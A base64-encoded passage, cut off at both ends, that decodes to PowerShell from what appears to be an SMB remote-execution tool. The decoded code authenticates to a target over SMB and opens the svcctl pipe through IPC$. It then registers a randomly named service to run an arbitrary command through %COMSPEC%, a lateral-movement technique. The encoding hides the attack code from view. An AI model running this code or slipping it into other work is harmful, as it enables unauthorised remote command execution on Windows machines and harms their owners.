N0aW9uYXJ5ICRwYWNrZXRfU01CMl9kYXRhDQogICAgICAgICRwYWNrZXRfTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgPSBHZXQtUGFja2V0TmV0QklPU1Nlc3Npb25TZXJ2aWNlICRTTUIyX2hlYWRlci5MZW5ndGggJFNNQjJfZGF0YS5MZW5ndGgNCiAgICAgICAgJE5ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9OZXRCSU9TX3Nlc3Npb25fc2VydmljZQ0KICAgICAgICAkU01CX2NsaWVudF9zZW5kID0gJE5ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlICsgJFNNQjJfaGVhZGVyICsgJFNNQjJfZGF0YQ0KICAgIH0NCg0KICAgICRTTUJfY2xpZW50X3N0cmVhbS5Xcml0ZSgkU01CX2NsaWVudF9zZW5kLDAsJFNNQl9jbGllbnRfc2VuZC5MZW5ndGgpID4gJG51bGwNCiAgICAkU01CX2NsaWVudF9zdHJlYW0uRmx1c2goKQ0KICAgICRTTUJfY2xpZW50X3N0cmVhbS5SZWFkKCRTTUJfY2xpZW50X3JlY2VpdmUsMCwkU01CX2NsaWVudF9yZWNlaXZlLkxlbmd0aCkgPiAkbnVsbA0KDQogICAgaWYoJFNNQl92ZXJzaW9uIC1lcSAnU01CMScpDQogICAgew0KDQogICAgICAgIGlmKFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJFNNQl9jbGllbnRfcmVjZWl2ZVs5Li4xMl0pIC1lcSAnMDAtMDAtMDAtMDAnKQ0KICAgICAgICB7DQogICAgICAgICAgICBXcml0ZS1WZXJib3NlICIkb3V0cHV0X3VzZXJuYW1lIHN1Y2Nlc3NmdWxseSBhdXRoZW50aWNhdGVkIG9uICRUYXJnZXQiDQogICAgICAgICAgICAkbG9naW5fc3VjY2Vzc2Z1bCA9ICR0cnVlDQogICAgICAgIH0NCiAgICAgICAgZWxzZQ0KICAgICAgICB7DQogICAgICAgICAgICBXcml0ZS1PdXRwdXQgIiRvdXRwdXRfdXNlcm5hbWUgZmFpbGVkIHRvIGF1dGhlbnRpY2F0ZSBvbiAkVGFyZ2V0Ig0KICAgICAgICAgICAgJGxvZ2luX3N1Y2Nlc3NmdWwgPSAkZmFsc2UNCiAgICAgICAgfQ0KDQogICAgfQ0KICAgIGVsc2UNCiAgICB7DQogICAgICAgIGlmKFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJFNNQl9jbGllbnRfcmVjZWl2ZVsxMi4uMTVdKSAtZXEgJzAwLTAwLTAwLTAwJykNCiAgICAgICAgew0KICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiJG91dHB1dF91c2VybmFtZSBzdWNjZXNzZnVsbHkgYXV0aGVudGljYXRlZCBvbiAkVGFyZ2V0Ig0KICAgICAgICAgICAgJGxvZ2luX3N1Y2Nlc3NmdWwgPSAkdHJ1ZQ0KICAgICAgICB9DQogICAgICAgIGVsc2UNCiAgICAgICAgew0KICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICIkb3V0cHV0X3VzZXJuYW1lIGZhaWxlZCB0byBhdXRoZW50aWNhdGUgb24gJFRhcmdldCINCiAgICAgICAgICAgICRsb2dpbl9zdWNjZXNzZnVsID0gJGZhbHNlDQogICAgICAgIH0NCg0KICAgIH0NCg0KICAgIGlmKCRsb2dpbl9zdWNjZXNzZnVsKQ0KICAgIHsNCiAgICAgICAgJFNNQl9wYXRoID0gIlxcIiArICRUYXJnZXQgKyAiXElQQyQiDQoNCiAgICAgICAgaWYoJFNNQl92ZXJzaW9uIC1lcSAnU01CMScpDQogICAgICAgIHsNCiAgICAgICAgICAgICRTTUJfcGF0aF9ieXRlcyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJFNNQl9wYXRoKSArIDB4MDANCiAgICAgICAgfQ0KICAgICAgICBlbHNlDQogICAgICAgIHsNCiAgICAgICAgICAgICRTTUJfcGF0aF9ieXRlcyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVuaWNvZGUuR2V0Qnl0ZXMoJFNNQl9wYXRoKQ0KICAgICAgICB9DQoNCiAgICAgICAgJFNNQl9uYW1lZF9waXBlX1VVSUQgPSAweDgxLDB4YmIsMHg3YSwweDM2LDB4NDQsMHg5OCwweGYxLDB4MzUsMHhhZCwweDMyLDB4OTgsMHhmMCwweDM4LDB4MDAsMHgxMCwweDAzDQoNCiAgICAgICAgaWYoISRTZXJ2aWNlKQ0KICAgICAgICB7DQogICAgICAgICAgICAkU01CX3NlcnZpY2VfcmFuZG9tID0gW1N0cmluZ106OkpvaW4oIjAwLSIsKDEuLjIwIHwgRm9yRWFjaC1PYmplY3R7InswOlgyfS0iIC1mIChHZXQtUmFuZG9tIC1NaW5pbXVtIDY1IC1NYXhpbXVtIDkwKX0pKQ0KICAgICAgICAgICAgJFNNQl9zZXJ2aWNlID0gJFNNQl9zZXJ2aWNlX3JhbmRvbSAtcmVwbGFjZSAiLTAwIiwiIg0KICAgICAgICAgICAgJFNNQl9zZXJ2aWNlID0gJFNNQl9zZXJ2aWNlLlN1YnN0cmluZygwLCRTTUJfc2VydmljZS5MZW5ndGggLSAxKQ0KICAgICAgICAgICAgJFNNQl9zZXJ2aWNlID0gJFNNQl9zZXJ2aWNlLlNwbGl0KCItIikgfCBGb3JFYWNoLU9iamVjdHtbQ2hhcl1bU3lzdGVtLkNvbnZlcnRdOjpUb0ludDE2KCRfLDE2KX0NCiAgICAgICAgICAgICRTTUJfc2VydmljZSA9IE5ldy1PYmplY3QgU3lzdGVtLlN0cmluZyAoJFNNQl9zZXJ2aWNlLDAsJFNNQl9zZXJ2aWNlLkxlbmd0aCkNCiAgICAgICAgICAgICRTTUJfc2VydmljZV9yYW5kb20gKz0gJzAwLTAwLTAwLTAwLTAwJw0KICAgICAgICAgICAgJFNNQl9zZXJ2aWNlX2J5dGVzID0gJFNNQl9zZXJ2aWNlX3JhbmRvbS5TcGxpdCgiLSIpIHwgRm9yRWFjaC1PYmplY3R7W0NoYXJdW1N5c3RlbS5Db252ZXJ0XTo6VG9JbnQxNigkXywxNil9DQogICAgICAgIH0NCiAgICAgICAgZWxzZQ0KICAgICAgICB7DQogICAgICAgICAgICAkU01CX3NlcnZpY2UgPSAkU2VydmljZQ0KICAgICAgICAgICAgJFNNQl9zZXJ2aWNlX2J5dGVzID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VW5pY29kZS5HZXRCeXRlcygkU01CX3NlcnZpY2UpDQoNCiAgICAgICAgICAgIGlmKFtCb29sXSgkU01CX3NlcnZpY2UuTGVuZ3RoICUgMikpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgJFNNQl9zZXJ2aWNlX2J5dGVzICs9IDB4MDAsMHgwMA0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICRTTUJfc2VydmljZV9ieXRlcyArPSAweDAwLDB4MDAsMHgwMCwweDAwDQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICB9DQoNCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgJFNNQl9zZXJ2aWNlX2xlbmd0aCA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJFNNQl9zZXJ2aWNlLmxlbmd0aCArIDEpDQoNCiAgICAgICAgaWYoJENvbW1hbmRDT01TUEVDIC1lcSAnWScpDQogICAgICAgIHsNCiAgICAgICAgICAgICRDb21tYW5kID0gIiVDT01TUEVDJSAvQyBgIiIgKyAkQ29tbWFuZCArICJgIiINCiAgICAgICAgfQ0KICAgICAgICBlbHNlDQogICAgICAgIHsNCiAgICAgICAgICAgICRDb21tYW5kID0gImAiIiArICRDb21tYW5kICsgImAiIg0KICAgICAgICB9DQoNCiAgICAgICAgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygkQ29tbWFuZCkgfCBGb3JFYWNoLU9iamVjdHskU01CRXhlY19jb21tYW5kICs9ICJ7MDpYMn0tMDAtIiAtZiAkX30NCg0KICAgICAgICBpZihbQm9vbF0oJENvbW1hbmQuTGVuZ3RoICUgMikpDQogICAgICAgIHsNCiAgICAgICAgICAgICRTTUJFeGVjX2NvbW1hbmQgKz0gJzAwLTAwJw0KICAgICAgICB9DQogICAgICAgIGVsc2UNCiAgICAgICAgew0KICAgICAgICAgICAgJFNNQkV4ZWNfY29tbWFuZCArPSAnMDAtMDAtMDAtMDAnDQogICAgICAgIH0gICAgDQogICAgICAgIA0KICAgICAgICAkU01CRXhlY19jb21tYW5kX2J5dGVzID0gJFNNQkV4ZWNfY29tbWFuZC5TcGxpdCgiLSIpIHwgRm9yRWFjaC1PYmplY3R7W0NoYXJdW1N5c3RlbS5Db252ZXJ0XTo6VG9JbnQxNigkXywxNil9ICANCiAgICAgICAgJFNNQkV4ZWNfY29tbWFuZF9sZW5ndGhfYnl0ZXMgPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRTTUJFeGVjX2NvbW1hbmRfYnl0ZXMuTGVuZ3RoIC8gMikNCiAgICAgICAgDQoNCiAgICAgICAgaWYoJFNNQl92ZXJzaW9uIC1lcSAnU01CMScpDQogICAgICAgIHsNCiAgICAgICAgICAgICRTTUJfY2xpZW50X3N0YWdlID0gJ1RyZWVDb25uZWN0QW5kWFJlcXVlc3QnDQoNCiAgICAgICAgICAgIDpTTUJfZXhlY3V0ZV9sb29wIHdoaWxlICgkU01CX2NsaWVudF9zdGFnZSAtbmUgJ2V4aXQnKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgc3dpdGNoICgkU01CX2NsaWVudF9zdGFnZSkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgJ1RyZWVDb25uZWN0QW5kWFJlcXVlc3QnDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CX2hlYWRlciA9IEdldC1QYWNrZXRTTUJIZWFkZXIgMHg3NSAweDE4IDB4MDEsMHg0OCAweGZmLDB4ZmYgJHByb2Nlc3NfSURfYnl0ZXMgJFNNQl91c2VyX0lEDQoNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRTTUJfc2lnbmluZykNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTUQ1ID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5NRDVDcnlwdG9TZXJ2aWNlUHJvdmlkZXINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQl9oZWFkZXJbIlNNQkhlYWRlcl9GbGFnczIiXSA9IDB4MDUsMHg0OA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfc2lnbmluZ19jb3VudGVyID0gMiANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBbQnl0ZVtdXSRTTUJfc2lnbmluZ19zZXF1ZW5jZSA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJFNNQl9zaWduaW5nX2NvdW50ZXIpICsgMHgwMCwweDAwLDB4MDAsMHgwMA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CX2hlYWRlclsiU01CSGVhZGVyX1NpZ25hdHVyZSJdID0gJFNNQl9zaWduaW5nX3NlcXVlbmNlDQogICAgICAgICAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfaGVhZGVyID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUJfaGVhZGVyICAgDQogICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQl9kYXRhID0gR2V0LVBhY2tldFNNQlRyZWVDb25uZWN0QW5kWFJlcXVlc3QgJFNNQl9wYXRoX2J5dGVzDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX2RhdGEgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NNQl9kYXRhDQogICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X05ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlID0gR2V0LVBhY2tldE5ldEJJT1NTZXNzaW9uU2VydmljZSAkU01CX2hlYWRlci5MZW5ndGggJFNNQl9kYXRhLkxlbmd0aA0KICAgICAgICAgICAgICAgICAgICAgICAgJE5ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9OZXRCSU9TX3Nlc3Npb25fc2VydmljZQ0KDQogICAgICAgICAgICAgICAgICAgICAgICBpZigkU01CX3NpZ25pbmcpDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9zaWduID0gJHNlc3Npb25fa2V5ICsgJFNNQl9oZWFkZXIgKyAkU01CX2RhdGEgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9zaWduYXR1cmUgPSAkTUQ1LkNvbXB1dGVIYXNoKCRTTUJfc2lnbikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX3NpZ25hdHVyZSA9ICRTTUJfc2lnbmF0dXJlWzAuLjddDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUJfaGVhZGVyWyJTTUJIZWFkZXJfU2lnbmF0dXJlIl0gPSAkU01CX3NpZ25hdHVyZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfaGVhZGVyID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUJfaGVhZGVyDQogICAgICAgICAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3NlbmQgPSAkTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgKyAkU01CX2hlYWRlciArICRTTUJfZGF0YQ0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RyZWFtLldyaXRlKCRTTUJfY2xpZW50X3NlbmQsMCwkU01CX2NsaWVudF9zZW5kLkxlbmd0aCkgPiAkbnVsbA0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RyZWFtLkZsdXNoKCkNCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5SZWFkKCRTTUJfY2xpZW50X3JlY2VpdmUsMCwkU01CX2NsaWVudF9yZWNlaXZlLkxlbmd0aCkgPiAkbnVsbA0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RhZ2UgPSAnQ3JlYXRlQW5kWFJlcXVlc3QnDQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAnQ3JlYXRlQW5kWFJlcXVlc3QnDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfbmFtZWRfcGlwZV9ieXRlcyA9IDB4NWMsMHg3MywweDc2LDB4NjMsMHg2MywweDc0LDB4NmMsMHgwMCAjIFxzdmNjdGwNCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfdHJlZV9JRCA9ICRTTUJfY2xpZW50X3JlY2VpdmVbMjgsMjldDQogICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQl9oZWFkZXIgPSBHZXQtUGFja2V0U01CSGVhZGVyIDB4YTIgMHgxOCAweDAyLDB4MjggJFNNQl90cmVlX0lEICRwcm9jZXNzX0lEX2J5dGVzICRTTUJfdXNlcl9JRA0KDQogICAgICAgICAgICAgICAgICAgICAgICBpZigkU01CX3NpZ25pbmcpDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUJfaGVhZGVyWyJTTUJIZWFkZXJfRmxhZ3MyIl0gPSAweDA1LDB4NDgNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX3NpZ25pbmdfY291bnRlciA9ICRTTUJfc2lnbmluZ19jb3VudGVyICsgMg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFtCeXRlW11dJFNNQl9zaWduaW5nX3NlcXVlbmNlID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkU01CX3NpZ25pbmdfY291bnRlcikgKyAweDAwLDB4MDAsMHgwMCwweDAwDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUJfaGVhZGVyWyJTTUJIZWFkZXJfU2lnbmF0dXJlIl0gPSAkU01CX3NpZ25pbmdfc2VxdWVuY2UNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9oZWFkZXIgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NNQl9oZWFkZXIgICANCiAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CX2RhdGEgPSBHZXQtUGFja2V0U01CTlRDcmVhdGVBbmRYUmVxdWVzdCAkU01CX25hbWVkX3BpcGVfYnl0ZXMNCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfZGF0YSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfU01CX2RhdGENCiAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgPSBHZXQtUGFja2V0TmV0QklPU1Nlc3Npb25TZXJ2aWNlICRTTUJfaGVhZGVyLkxlbmd0aCAkU01CX2RhdGEuTGVuZ3RoDQogICAgICAgICAgICAgICAgICAgICAgICAkTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X05ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlDQoNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRTTUJfc2lnbmluZykNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX3NpZ24gPSAkc2Vzc2lvbl9rZXkgKyAkU01CX2hlYWRlciArICRTTUJfZGF0YSANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX3NpZ25hdHVyZSA9ICRNRDUuQ29tcHV0ZUhhc2goJFNNQl9zaWduKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfc2lnbmF0dXJlID0gJFNNQl9zaWduYXR1cmVbMC4uN10NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQl9oZWFkZXJbIlNNQkhlYWRlcl9TaWduYXR1cmUiXSA9ICRTTUJfc2lnbmF0dXJlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9oZWFkZXIgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NNQl9oZWFkZXINCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc2VuZCA9ICROZXRCSU9TX3Nlc3Npb25fc2VydmljZSArICRTTUJfaGVhZGVyICsgJFNNQl9kYXRhDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uV3JpdGUoJFNNQl9jbGllbnRfc2VuZCwwLCRTTUJfY2xpZW50X3NlbmQuTGVuZ3RoKSA+ICRudWxsDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uRmx1c2goKQ0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RyZWFtLlJlYWQoJFNNQl9jbGllbnRfcmVjZWl2ZSwwLCRTTUJfY2xpZW50X3JlY2VpdmUuTGVuZ3RoKSA+ICRudWxsDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdGFnZSA9ICdSUENCaW5kJw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICdSUENCaW5kJw0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX0ZJRCA9ICRTTUJfY2xpZW50X3JlY2VpdmVbNDIsNDNdDQogICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQl9oZWFkZXIgPSBHZXQtUGFja2V0U01CSGVhZGVyIDB4MmYgMHgxOCAweDA1LDB4MjggJFNNQl90cmVlX0lEICRwcm9jZXNzX0lEX2J5dGVzICRTTUJfdXNlcl9JRA0KDQogICAgICAgICAgICAgICAgICAgICAgICBpZigkU01CX3NpZ25pbmcpDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUJfaGVhZGVyWyJTTUJIZWFkZXJfRmxhZ3MyIl0gPSAweDA1LDB4NDgNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX3NpZ25pbmdfY291bnRlciA9ICRTTUJfc2lnbmluZ19jb3VudGVyICsgMiANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBbQnl0ZVtdXSRTTUJfc2lnbmluZ19zZXF1ZW5jZSA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJFNNQl9zaWduaW5nX2NvdW50ZXIpICsgMHgwMCwweDAwLDB4MDAsMHgwMA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CX2hlYWRlclsiU01CSGVhZGVyX1NpZ25hdHVyZSJdID0gJFNNQl9zaWduaW5nX3NlcXVlbmNlDQogICAgICAgICAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfaGVhZGVyID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUJfaGVhZGVyDQogICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1JQQ19kYXRhID0gR2V0LVBhY2tldFJQQ0JpbmQgMSAweGI4LDB4MTAgMHgwMSAweDAwLDB4MDAgJFNNQl9uYW1lZF9waXBlX1VVSUQgMHgwMiwweDAwDQogICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQl9kYXRhID0gR2V0LVBhY2tldFNNQldyaXRlQW5kWFJlcXVlc3QNCiAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CX2RhdGFbIlNNQldyaXRlQW5kWFJlcXVlc3RfUmVtYWluaW5nIl0gPSAweDQ4LDB4MDANCiAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CX2RhdGFbIlNNQldyaXRlQW5kWFJlcXVlc3RfRGF0YUxlbmd0aExvdyJdID0gMHg0OCwweDAwDQogICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQl9kYXRhWyJTTUJXcml0ZUFuZFhSZXF1ZXN0X0J5dGVDb3VudCJdID0gMHg0OCwweDAwDQogICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQl9kYXRhWyJTTUJXcml0ZUFuZFhSZXF1ZXN0X0ZJRCJdID0gJFNNQl9GSUQNCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfZGF0YSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfU01CX2RhdGENCiAgICAgICAgICAgICAgICAgICAgICAgICRSUENfZGF0YSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfUlBDX2RhdGEgDQogICAgICAgICAgICAgICAgICAgICAgICAkUlBDX2RhdGFfbGVuZ3RoID0gJFNNQl9kYXRhLkxlbmd0aCArICRSUENfZGF0YS5MZW5ndGgNCiAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgPSBHZXQtUGFja2V0TmV0QklPU1Nlc3Npb25TZXJ2aWNlICRTTUJfaGVhZGVyLkxlbmd0aCAkUlBDX2RhdGFfTGVuZ3RoDQogICAgICAgICAgICAgICAgICAgICAgICAkTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X05ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlDQoNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRTTUJfc2lnbmluZykNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX3NpZ24gPSAkc2Vzc2lvbl9rZXkgKyAkU01CX2hlYWRlciArICRTTUJfZGF0YSArICRSUENfZGF0YQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfc2lnbmF0dXJlID0gJE1ENS5Db21wdXRlSGFzaCgkU01CX3NpZ24pDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9zaWduYXR1cmUgPSAkU01CX3NpZ25hdHVyZVswLi43XQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CX2hlYWRlclsiU01CSGVhZGVyX1NpZ25hdHVyZSJdID0gJFNNQl9zaWduYXR1cmUNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2hlYWRlciA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfU01CX2hlYWRlcg0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zZW5kID0gJE5ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlICsgJFNNQl9oZWFkZXIgKyAkU01CX2RhdGEgKyAkUlBDX2RhdGENCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5Xcml0ZSgkU01CX2NsaWVudF9zZW5kLDAsJFNNQl9jbGllbnRfc2VuZC5MZW5ndGgpID4gJG51bGwNCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5GbHVzaCgpDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uUmVhZCgkU01CX2NsaWVudF9yZWNlaXZlLDAsJFNNQl9jbGllbnRfcmVjZWl2ZS5MZW5ndGgpID4gJG51bGwNCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0YWdlID0gJ1JlYWRBbmRYUmVxdWVzdCcNCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0YWdlX25leHQgPSAnT3BlblNDTWFuYWdlclcnDQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAnUmVhZEFuZFhSZXF1ZXN0Jw0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBTdGFydC1TbGVlcCAtbSAkU2xlZXANCiAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CX2hlYWRlciA9IEdldC1QYWNrZXRTTUJIZWFkZXIgMHgyZSAweDE4IDB4MDUsMHgyOCAkU01CX3RyZWVfSUQgJHByb2Nlc3NfSURfYnl0ZXMgJFNNQl91c2VyX0lEDQoNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRTTUJfc2lnbmluZykNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQl9oZWFkZXJbIlNNQkhlYWRlcl9GbGFnczIiXSA9IDB4MDUsMHg0OA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfc2lnbmluZ19jb3VudGVyID0gJFNNQl9zaWduaW5nX2NvdW50ZXIgKyAyIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFtCeXRlW11dJFNNQl9zaWduaW5nX3NlcXVlbmNlID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkU01CX3NpZ25pbmdfY291bnRlcikgKyAweDAwLDB4MDAsMHgwMCwweDAwDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUJfaGVhZGVyWyJTTUJIZWFkZXJfU2lnbmF0dXJlIl0gPSAkU01CX3NpZ25pbmdfc2VxdWVuY2UNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9oZWFkZXIgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NNQl9oZWFkZXIgICANCiAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CX